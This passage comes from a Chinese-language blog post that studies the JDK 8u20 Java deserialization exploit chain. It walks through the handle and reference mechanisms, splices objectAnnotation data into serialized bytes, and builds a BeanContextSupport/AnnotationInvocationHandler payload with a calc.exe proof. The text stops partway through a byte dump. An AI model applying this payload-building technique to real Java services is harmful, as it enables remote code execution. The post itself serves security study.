class_">InvalidObjectException</span>(<br>               <span class="hljs-string">&quot;cannot read back reference as unshared&quot;</span>);<br>       &#125;<br><br>       <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> handles.lookupObject(passHandle);<br>       <span class="hljs-keyword">if</span> (obj == unsharedMarker) &#123;<br>           <span class="hljs-comment">// REMIND: what type of exception to throw here?</span><br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<br>               <span class="hljs-string">&quot;cannot read back reference to unshared object&quot;</span>);<br>       &#125;<br>       <span class="hljs-keyword">return</span> obj;<br>   &#125;<br></code></pre></td></tr></table></figure>

<p>这个方法会从字节流中读取<code>TC_REFERENCE</code>标记段，它会把读取的引用<code>Handle</code>赋值给<code>passHandle</code>变量，然后传入<code>lookupObject()</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Object <span class="hljs-title function_">lookupObject</span><span class="hljs-params">(<span class="hljs-type">int</span> handle)</span> &#123;<br>    <span class="hljs-keyword">return</span> (handle != NULL_HANDLE &amp;&amp;<br>            status[handle] != STATUS_EXCEPTION) ?<br>        entries[handle] : <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在<code>lookupObject()</code>方法中，如果引用的<code>handle</code>不为空、没有关联的<code>ClassNotFoundException</code>（<code>status[handle] != STATUS_EXCEPTION</code>），那么就返回给定<code>handle</code>的引用对象，最后由<code>readHandle</code>方法返回给对象。</p>
<p>也就是说，反序列化流程还原到<code>TC_REFERENCE</code>的时候，会尝试还原引用的<code>handle</code>对象。</p>
<p>谈完了引用机制现在在来看数据插入的问题，<strong>如何能在类<code>AnnotationInvocationHandler</code>的序列化数据中插入一部分源代码中没有的数据？</strong></p>
<p>利用<code>objectAnnotation</code>！</p>
<h3 id="插入不存在数据"><a href="#插入不存在数据" class="headerlink" title="插入不存在数据"></a>插入不存在数据</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.jdk8u20;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DoubleSerialize</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> serialVersionUID=<span class="hljs-number">100L</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream input)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        input.defaultReadObject();<br>        System.out.println(<span class="hljs-string">&quot;hello&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream output)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        output.defaultWriteObject();<br>        output.writeObject(<span class="hljs-string">&quot;Panda&quot;</span>);<br>        output.writeUTF(<span class="hljs-string">&quot;this is a test data&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">DoubleSerialize</span> <span class="hljs-variable">doubleSerialize</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DoubleSerialize</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;double3.ser&quot;</span>));<br>        oos.writeObject(doubleSerialize);<br>        oos.writeObject(doubleSerialize);<br>        oos.close();<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<p>在这个示例中，我们重写了<code>writeObject</code>方法，并且在该方法中利用<code>writeObject</code>和<code>writeUTF</code>方法写入了<code>Panda</code>对象以及<code>This is a test data!</code>字符串，该段序列化数据内容如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">PS D:\Code_Project\Go\zkar-master&gt; go run main.go dump -f <span class="hljs-string">&quot;D:\Code_Project\Java\ysoserial-master\double3.ser&quot;</span><br><span class="hljs-meta">@Magic</span> - <span class="hljs-number">0xac</span> ed<br><span class="hljs-meta">@Version</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br><span class="hljs-meta">@Contents</span><br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>      <span class="hljs-meta">@ClassName</span><br>        <span class="hljs-meta">@Length</span> - <span class="hljs-number">33</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">21</span><br>        <span class="hljs-meta">@Value</span> - ysoserial.jdk8u20.DoubleSerialize - <span class="hljs-number">0x79</span> <span class="hljs-number">73</span> <span class="hljs-number">6f</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c 2e 6a <span class="hljs-number">64</span> 6b <span class="hljs-number">38</span> <span class="hljs-number">75</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> 2e <span class="hljs-number">44</span> <span class="hljs-number">6f</span> <span class="hljs-number">75</span> <span class="hljs-number">62</span> 6c <span class="hljs-number">65</span> <span class="hljs-number">53</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c <span class="hljs-number">69</span> 7a <span class="hljs-number">65</span><br>      <span class="hljs-meta">@SerialVersionUID</span> - <span class="hljs-number">100</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">64</span><br>      <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257536</span><br>      <span class="hljs-meta">@ClassDescFlags</span> - SC_SERIALIZABLE|SC_WRITE_METHOD - <span class="hljs-number">0x03</span><br>      <span class="hljs-meta">@FieldCount</span> - <span class="hljs-number">0</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span><br>      []Fields<br>      []ClassAnnotations<br>        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>      <span class="hljs-meta">@SuperClassDesc</span><br>        TC_NULL - <span class="hljs-number">0x70</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span><br>    []ClassData<br>      <span class="hljs-meta">@ClassName</span> - ysoserial.jdk8u20.DoubleSerialize<br>        &#123;&#125;Attributes<br>        <span class="hljs-meta">@ObjectAnnotation</span><br>          TC_STRING - <span class="hljs-number">0x74</span><br>            <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257538</span><br>            <span class="hljs-meta">@Length</span> - <span class="hljs-number">5</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br>            <span class="hljs-meta">@Value</span> - Panda - <span class="hljs-number">0x50</span> <span class="hljs-number">61</span> 6e <span class="hljs-number">64</span> <span class="hljs-number">61</span><br>          TC_BLOCKDATA - <span class="hljs-number">0x77</span><br>            <span class="hljs-meta">@Blockdata</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">13</span> <span class="hljs-number">74</span> <span class="hljs-number">68</span> <span class="hljs-number">69</span> <span class="hljs-number">73</span> <span class="hljs-number">20</span> <span class="hljs-number">69</span> <span class="hljs-number">73</span> <span class="hljs-number">20</span> <span class="hljs-number">61</span> <span class="hljs-number">20</span> <span class="hljs-number">74</span> <span class="hljs-number">65</span> <span class="hljs-number">73</span> <span class="hljs-number">74</span> <span class="hljs-number">20</span> <span class="hljs-number">64</span> <span class="hljs-number">61</span> <span class="hljs-number">74</span> <span class="hljs-number">61</span><br>          TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>  TC_REFERENCE - <span class="hljs-number">0x71</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span> - <span class="hljs-number">0x00</span> 7e <span class="hljs-number">00</span> <span class="hljs-number">01</span><br><br><br></code></pre></td></tr></table></figure>

<p>使用beyondCompare比较他们之间的区别</p>
<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230415192151850.png" srcset="/img/loading.gif" lazyload alt="image-20230415192151850"> </p>
<p>可以看到原先表示类描述信息标记由<code>0x02 - SC_SERIALIZABLE</code>变成了<code>0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE</code>，并且在原有序列化数据结构的最下方还多了由<code>objectAnnotation</code>标识的内容段，这里的内容段会在反序列化的时候被还原</p>
<p><strong>为什么会有这种变化？</strong></p>
<p><strong>知识点1：</strong>如果一个可序列化的类重写了<code>writeObject</code>方法，而且向字节流写入了一些额外的数据，那么会设置<code>SC_WRITE_METHOD</code>标识，这种情况下，一般使用结束符<code>TC_ENDBLOCKDATA</code>来标记这个对象的数据结束；</p>
<p>所以图中出现了这样的变化</p>
<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230415192533851.png" srcset="/img/loading.gif" lazyload alt="image-20230415192533851"> </p>
<p><strong>知识点2：</strong>如果一个可序列化的类重写了<code>writeObject</code>方法，在该序列化数据的<code>classdata</code>部分，还会多出个<code>objectAnnotation</code>部分，并且如果重写的<code>writeObject()</code>方法内除了调用<code>defaultWriteObject()</code>方法写对象字段数据，还向字节流中写入了自定义数据，那么在<code>objectAnnotation</code>部分会有写入自定义数据对应的结构和值；</p>
<p>正常情况下，我们没有办法修改可序列化类本身的内容，也就没办法重写这个类中的<code>writeObject</code>方法，也就没法让序列化数据中多出来<code>objectAnnotation</code>内容段</p>
<p>序列化数据只是一块二进制的数据而已，只要按照序列化预定的规则来修改其hex数据，那么实际上就是相当于在重写的<code>writeObject</code>方法中添加数据</p>
<p>在写入数据前，我们要考虑一件事，<strong>谁向谁写入数据？</strong>是先序列化<code>AnnotationInvocationHandler</code>类然后向其中插入<code>BeanContextSupport</code>对象，还是先序列化<code>BeanContextSupport</code>类然后向其中插入<code>AnnotationInvocationHandler</code>对象？</p>
<h3 id="payload产生（这里不知道为什么不能够RCE）"><a href="#payload产生（这里不知道为什么不能够RCE）" class="headerlink" title="payload产生（这里不知道为什么不能够RCE）"></a>payload产生（这里不知道为什么不能够RCE）</h3><p>先思考<code>jdk7u21</code>被修复的原因是什么？是因为在反序列化的过程中有异常抛出，从而导致反序列化的进程被终止了！</p>
<p>这让我们不得不联想到我们在基础知识的<code>Try/catch块的作用</code>中做的结论：</p>
<blockquote>
<p><strong>在一个存在<code>try ... catch</code>块的方法（无异常抛出）中去调用另一个存在<code>try ... catch</code>块的方法（有异常抛出），如果被调用的方法（有异常抛出）出错，那么会导致<code>调用方法</code>出错且不会继续执行完<code>调用方法</code>的代码逻辑，但是<code>不会</code>终止代码运行的进程</strong></p>
</blockquote>
<p>我们要的就是不要终止我们的反序列化进程，这样我们就可以取得反序列化后的类对象。</p>
<p>所以我们需要先序列化<code>BeanContextSupport</code>类（无异常抛出）然后向其中插入<code>AnnotationInvocationHandler</code>对象（有异常抛出）</p>
<p>这里还有一点要注意，因为根据<code>成员抛弃</code>机制我们知道，如果序列化流新增的这个值是一个对象的话，那么会为这个值分配一个<code> Handle</code>，但由于我们是手动插入<code>Handle</code>，所以需要修改引用<code>Handle</code>的值（就是<code>TC_ENDBLOCKDATA</code>块中<code>handle</code>的引用值）为<code>AnnotationInvocationHandler</code>对象的<code>handle</code>地址</p>
<p>所以我们先序列化BeanContextSupport类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.jdk8u20;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        payload();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">payload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">BeanContextSupport</span> <span class="hljs-variable">beanContextSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanContextSupport</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;test1&quot;</span>));<br>        test1.writeObject(beanContextSupport);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>利用zkar读出数据结构</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java">PS D:\Code_Project\Go\zkar-master&gt; go run main.go dump -f <span class="hljs-string">&quot;D:\Code_Project\Java\ysoserial-master\test1&quot;</span>      <br><span class="hljs-meta">@Magic</span> - <span class="hljs-number">0xac</span> ed<br><span class="hljs-meta">@Version</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br><span class="hljs-meta">@Contents</span><br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>      <span class="hljs-meta">@ClassName</span><br>        <span class="hljs-meta">@Length</span> - <span class="hljs-number">36</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">24</span><br>        <span class="hljs-meta">@Value</span> - ysoserial.jdk8u20.BeanContextSupport - <span class="hljs-number">0x79</span> <span class="hljs-number">73</span> <span class="hljs-number">6f</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c 2e 6a <span class="hljs-number">64</span> 6b <span class="hljs-number">38</span> <span class="hljs-number">75</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> 2e <span class="hljs-number">42</span> <span class="hljs-number">65</span> <span class="hljs-number">61</span> 6e <span class="hljs-number">43</span> <span class="hljs-number">6f</span> 6e <span class="hljs-number">74</span> <span class="hljs-number">65</span> <span class="hljs-number">78</span> <span class="hljs-number">74</span> <span class="hljs-number">53</span> <span class="hljs-number">75</span> <span class="hljs-number">70</span> <span class="hljs-number">70</span> <span class="hljs-number">6f</span> <span class="hljs-number">72</span> <span class="hljs-number">74</span><br>      <span class="hljs-meta">@SerialVersionUID</span> - <span class="hljs-number">20</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">14</span><br>      <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257536</span><br>      <span class="hljs-meta">@ClassDescFlags</span> - SC_SERIALIZABLE - <span class="hljs-number">0x02</span><br>      <span class="hljs-meta">@FieldCount</span> - <span class="hljs-number">0</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span><br>      []Fields<br>      []ClassAnnotations<br>        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>      <span class="hljs-meta">@SuperClassDesc</span><br>        TC_NULL - <span class="hljs-number">0x70</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span><br>    []ClassData<br>      <span class="hljs-meta">@ClassName</span> - ysoserial.jdk8u20.BeanContextSupport<br>        &#123;&#125;Attributes<br><br></code></pre></td></tr></table></figure>

<p>然后序列化<code>AnnotationInvocationHandler</code>类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.jdk8u20;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        payload();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">payload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        AnnotationInvocationHandler handler=<span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationInvocationHandler</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;test2&quot;</span>));<br>        out.writeObject(handler);<br>        out.close();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;test2&quot;</span>));<br>        AnnotationInvocationHandler str=(AnnotationInvocationHandler)in.readObject();<br>        str.exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>zkar查看</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java">PS D:\Code_Project\Go\zkar-master&gt; go run main.go dump -f <span class="hljs-string">&quot;D:\Code_Project\Java\ysoserial-master\test2&quot;</span><br><span class="hljs-meta">@Magic</span> - <span class="hljs-number">0xac</span> ed<br><span class="hljs-meta">@Version</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br><span class="hljs-meta">@Contents</span><br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>      <span class="hljs-meta">@ClassName</span><br>        <span class="hljs-meta">@Length</span> - <span class="hljs-number">45</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">2d</span><br>        <span class="hljs-meta">@Value</span> - ysoserial.jdk8u20.AnnotationInvocationHandler - <span class="hljs-number">0x79</span> <span class="hljs-number">73</span> <span class="hljs-number">6f</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c 2e 6a <span class="hljs-number">64</span> 6b <span class="hljs-number">38</span> <span class="hljs-number">75</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> 2e <span class="hljs-number">41</span> 6e 6e <span class="hljs-number">6f</span> <span class="hljs-number">74</span> <span class="hljs-number">61</span> <span class="hljs-number">74</span> <span class="hljs-number">69</span> <span class="hljs-number">6f</span> 6e <span class="hljs-number">49</span> 6e <span class="hljs-number">76</span> <span class="hljs-number">6f</span> <span class="hljs-number">63</span> <span class="hljs-number">61</span> <span class="hljs-number">74</span> <span class="hljs-number">69</span> <span class="hljs-number">6f</span> 6e <span class="hljs-number">48</span> <span class="hljs-number">61</span> 6e <span class="hljs-number">64</span> 6c <span class="hljs-number">65</span> <span class="hljs-number">72</span><br>      <span class="hljs-meta">@SerialVersionUID</span> - <span class="hljs-number">10</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 0a<br>      <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257536</span><br>      <span class="hljs-meta">@ClassDescFlags</span> - SC_SERIALIZABLE - <span class="hljs-number">0x02</span><br>      <span class="hljs-meta">@FieldCount</span> - <span class="hljs-number">1</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">01</span><br>      []Fields<br>        Index <span class="hljs-number">0</span>:<br>          Integer - I - <span class="hljs-number">0x49</span><br>          <span class="hljs-meta">@FieldName</span><br>            <span class="hljs-meta">@Length</span> - <span class="hljs-number">4</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">04</span><br>            <span class="hljs-meta">@Value</span> - zero - <span class="hljs-number">0x7a</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">6f</span><br>      []ClassAnnotations<br>        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>      <span class="hljs-meta">@SuperClassDesc</span><br>        TC_NULL - <span class="hljs-number">0x70</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span><br>    []ClassData<br>      <span class="hljs-meta">@ClassName</span> - ysoserial.jdk8u20.AnnotationInvocationHandler<br>        &#123;&#125;Attributes<br>          <span class="hljs-title function_">zero</span><br>            <span class="hljs-params">(integer)</span><span class="hljs-number">0</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><br></code></pre></td></tr></table></figure>

<p>然后再利用<code>objectAnnotation</code>插入<code>AnnotationInvocationHandler</code>对象</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Magic</span> - <span class="hljs-number">0xac</span> ed<br><span class="hljs-meta">@Version</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br><span class="hljs-meta">@Contents</span><br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>      <span class="hljs-meta">@ClassName</span><br>        <span class="hljs-meta">@Length</span> - <span class="hljs-number">36</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">24</span><br>        <span class="hljs-meta">@Value</span> - ysoserial.jdk8u20.BeanContextSupport - <span class="hljs-number">0x79</span> <span class="hljs-number">73</span> <span class="hljs-number">6f</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c 2e 6a <span class="hljs-number">64</span> 6b <span class="hljs-number">38</span> <span class="hljs-number">75</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> 2e <span class="hljs-number">42</span> <span class="hljs-number">65</span> <span class="hljs-number">61</span> 6e <span class="hljs-number">43</span> <span class="hljs-number">6f</span> 6e <span class="hljs-number">74</span> <span class="hljs-number">65</span> <span class="hljs-number">78</span> <span class="hljs-number">74</span> <span class="hljs-number">53</span> <span class="hljs-number">75</span> <span class="hljs-number">70</span> <span class="hljs-number">70</span> <span class="hljs-number">6f</span> <span class="hljs-number">72</span> <span class="hljs-number">74</span><br>      <span class="hljs-meta">@SerialVersionUID</span> - <span class="hljs-number">20</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">14</span><br>      <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257536</span>  <br>      <span class="hljs-meta">@ClassDescFlags</span> - SC_SERIALIZABLE|SC_WRITE_METHOD - <span class="hljs-number">0x03</span><br>      <span class="hljs-meta">@FieldCount</span> - <span class="hljs-number">0</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span><br>      []Fields<br>      []ClassAnnotations<br>        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>      <span class="hljs-meta">@SuperClassDesc</span><br>        TC_NULL - <span class="hljs-number">0x70</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span><br>    []ClassData<br>      <span class="hljs-meta">@ClassName</span> - ysoserial.jdk8u20.BeanContextSupport<br>        &#123;&#125;Attributes<br><span 